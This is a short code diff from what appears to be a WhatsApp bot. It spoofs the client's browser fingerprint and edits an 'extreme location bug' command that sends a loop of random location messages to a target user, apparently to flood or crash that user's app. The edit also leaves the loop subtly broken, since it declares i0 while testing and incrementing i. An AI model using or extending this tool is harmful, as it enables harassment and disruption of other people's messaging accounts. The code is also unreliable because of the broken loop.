@@ -105,7 +105,7 @@ async function startBot() {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
         },
-        browser: Browsers.iPhone("Safari"),
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
         connectTimeoutMs: 60000,
         keepAliveIntervalMs: 25000,
         markOnlineOnConnect: true,
@@ -320,7 +320,7 @@ _System: DIIISSJJSS 100% TRUSTED | All-In-One Engine_`
                 
                 await sock.sendMessage(from, { text: "⚠️ Launching extreme location bug..." })
                 
-                for (let i = 0; i < 5; i++) {
+                for (let i0 = 0; i < 5; i++) {
                     await sock.sendMessage(target, {
                         location: {
                             degreesLatitude: Math.random() * 180 - 90,
